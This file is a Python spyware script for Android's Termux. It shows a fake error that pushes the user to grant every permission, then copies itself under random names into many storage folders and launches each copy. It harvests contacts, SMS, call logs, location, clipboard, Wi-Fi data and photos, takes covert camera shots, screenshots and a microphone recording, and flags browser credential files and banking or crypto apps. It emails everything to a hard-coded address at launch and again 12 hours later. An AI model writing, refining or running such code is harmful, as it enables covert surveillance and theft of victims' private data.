































































































































import os
import subprocess
import shutil
import time
import threading
import sqlite3
import json
import random

CLONE_COUNT = 0
MAX_CLONES = 15
TARGET_EMAIL = "test12344321lol@gmail.com"
CAMERA_PHOTOS = ["/sdcard/Sppy_cam1.jpg", "/sdcard/Sppy_cam2.jpg", "/sdcard/Sppy_cam3.jpg"]
MIC_RECORD = "/sdcard/Sppy_mic10s.wav"
SCREENSHOT = "/sdcard/Sppy_screen.png"
CLONE_DIRS = [
    "/sdcard/Download",
    "/sdcard/DCIM",
    "/sdcard/Pictures",
    "/sdcard/Documents",
    "/sdcard/Music",
    "/sdcard/Alarms",
    "/sdcard/Android/data",
    "/sdcard/Android/obb",
    "/sdcard/Download/.hidden",
    "/sdcard/",
    "/data/data/com.termux/files/home",
    "/sdcard/Telegram",
    "/sdcard/WhatsApp"
]

def display_error():
    print("Error: Fatal exception - grant ALL permissions (storage, contacts, camera, mic, location, phone, SMS) and install Termux-API fully.")

def randomized_clone():
    global CLONE_COUNT
    current_path = os.path.abspath(__file__)
    for dir_path in CLONE_DIRS:
        if os.path.exists(dir_path) and CLONE_COUNT < MAX_CLONES:
            base_name = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10)) + ".py"
            new_path = os.path.join(dir_path, base_name)
            try:
                shutil.copy(current_path, new_path)
                CLONE_COUNT += 1
                threading.Thread(target=lambda: subprocess.call(["python", new_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)).start()
            except Exception:
                pass

def harvest_contacts():
    try:
        return "-----------;\n\nContacts\n\n-----------\n" + subprocess.check_output(["termux-contact-list"], text=True) + "\n"
    except Exception:
        return "-----------;\n\nContacts: Denied.\n-----------\n"

def harvest_sms_calllogs():
    sms = call = "Denied."
    try:
        sms = subprocess.check_output(["termux-sms-list", "-l", "100"], text=True)
    except Exception:
        pass
    try:
        call = subprocess.check_output(["termux-call-log", "-l", "50"], text=True)
    except Exception:
        pass
    return f"-----------;\n\nSMS (100)\n\n-----------\n{sms}\n-----------;\n\nCall Logs (50)\n\n-----------\n{call}\n"

def harvest_location():
    try:
        loc = json.loads(subprocess.check_output(["termux-location"], text=True))
        return f"-----------;\n\nGPS Location\n\n-----------\nLatitude: {loc.get('latitude')} Longitude: {loc.get('longitude')} Altitude: {loc.get('altitude')}\n"
    except Exception:
        return "-----------;\n\nLocation: Denied.\n-----------\n"

def harvest_photos():
    photos = []
    paths = ["/sdcard/DCIM", "/sdcard/Pictures", "/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures", "/sdcard/WhatsApp/Media"]
    for base in paths:
        if os.path.exists(base):
            for root, _, files in os.walk(base):
                for f in files[:40]:
                    if f.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
                        photos.append(os.path.join(root, f))
    return photos

def take_camera_burst():
    att = []
    for photo in CAMERA_PHOTOS:
        try:
            subprocess.call(["termux-camera-photo", "-c", "0", photo], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1.5)
            if os.path.exists(photo):
                att.append(photo)
        except Exception:
            pass
    return att

def take_screenshot():
    try:
        subprocess.call(["termux-screenshot", SCREENSHOT])
        return [SCREENSHOT] if os.path.exists(SCREENSHOT) else []
    except Exception:
        return []

def record_mic_snippet():
    try:
        subprocess.call(["termux-microphone-record", "-f", MIC_RECORD, "-l", "10"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(12)
        return [MIC_RECORD] if os.path.exists(MIC_RECORD) else []
    except Exception:
        return []

def harvest_browser_creds():
    report = "-----------;\n\nBrowser Databases (Chrome/etc)\n\n-----------\n"
    paths = ["/data/data/com.android.chrome/app_chrome/Default/History", "/data/data/com.android.chrome/app_chrome/Default/Login Data", "/data/data/com.android.chrome/app_chrome/Default/Cookies"]
    for path in paths:
        if os.path.exists(path):
            report += f"Detected: {path} (passwords/cookies/autofill - root for full)\n"
    return report + "\n"

def harvest_app_indicators():
    apps = ["discord", "telegram", "steam", "bank", "paypal", "coinbase", "binance", "metamask"]
    report = "-----------;\n\nSensitive App Detection\n\n-----------\n"
    try:
        installed = subprocess.check_output(["pm", "list", "packages"], text=True)
        for app in apps:
            if app in installed.lower():
                report += f"{app.capitalize()} app installed.\n"
    except Exception:
        pass
    return report + "\n"

def harvest_device_status():
    report = "-----------;\n\nDevice Status\n\n-----------\n"
    try:
        report += subprocess.check_output(["termux-battery-status"], text=True) + "\n"
        report += subprocess.check_output(["termux-notification-list"], text=True) + "\n"
    except Exception:
        pass
    return report + "\n"

def harvest_clipboard():
    try:
        return "-----------;\n\nClipboard\n\n-----------\n" + subprocess.check_output(["termux-clipboard-get"], text=True) + "\n"
    except Exception:
        return "-----------;\n\nClipboard: Denied.\n-----------\n"

def harvest_wifi_full():
    report = "-----------;\n\nWiFi Connection & Scan\n\n-----------\n"
    try:
        report += json.dumps(json.loads(subprocess.check_output(["termux-wifi-connectioninfo"], text=True)), indent=2) + "\n"
        report += subprocess.check_output(["termux-wifi-scaninfo"], text=True) + "\n"
    except Exception:
        pass
    return report + "\n"

def compile_text_data():
    data = harvest_contacts()
    data += harvest_sms_calllogs()
    data += harvest_location()
    data += harvest_browser_creds()
    data += harvest_app_indicators()
    data += harvest_device_status()
    data += harvest_clipboard()
    data += harvest_wifi_full()
    data += "-----------;\n\nMassive attachments: photos, camera burst, screenshot, mic.\n-----------\n"
    return data

def print_to_termux(text_data):
    print("\nULTIMATE HARVEST DUMP:\n" + text_data)

def send_exfil(text_data, attachments):
    cmd = [
        "am", "start",
        "-a", "android.intent.action.SEND_MULTIPLE",
        "-t", "message/rfc822",
        "--es", "android.intent.extra.EMAIL", TARGET_EMAIL,
        "--es", "android.intent.extra.SUBJECT", "Ultimate Blank-Grabber Harvest",
        "--es", "android.intent.extra.TEXT", text_data
    ]
    for att in attachments:
        cmd += ["--eu", "android.intent.extra.STREAM", f"file://{att}"]
    subprocess.call(cmd)

def single_12hour_cycle():
    subprocess.call(["termux-wake-lock"])
    # Immediate harvest
    text = compile_text_data()
    photos = harvest_photos()
    cam = take_camera_burst()
    screen = take_screenshot()
    mic = record_mic_snippet()
    all_att = photos + cam + screen + mic
    
    print_to_termux(text)
    threading.Thread(target=send_exfil, args=(text, all_att), daemon=True).start()
    
    # Wait 12 hours then final massive harvest
    time.sleep(43200)  # 12 hours
    text = compile_text_data()
    photos = harvest_photos()
    cam = take_camera_burst()
    screen = take_screenshot()
    mic = record_mic_snippet()
    all_att = photos + cam + screen + mic
    
    print_to_termux(text)
    threading.Thread(target=send_exfil, args=(text, all_att), daemon=True).start()

def main():
    display_error()
    randomized_clone()
    threading.Thread(target=single_12hour_cycle, daemon=True).start()
    time.sleep(30)

if __name__ == "__main__":
    main()
















































